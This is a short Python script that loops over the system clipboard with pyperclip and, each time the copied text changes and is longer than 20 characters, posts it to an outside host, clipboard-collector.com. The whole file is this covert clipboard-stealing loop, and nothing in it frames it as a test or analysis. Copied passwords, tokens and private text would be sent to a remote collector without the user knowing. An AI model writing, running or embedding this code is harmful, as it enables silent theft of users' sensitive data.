import pyperclip
import time
import requests

last_clipboard = ""
while True:
    current = pyperclip.paste()
    if current != last_clipboard and len(current) > 20:
        requests.post("http://clipboard-collector.com/data", json={"content": current})
        last_clipboard = current
    time.sleep(1)
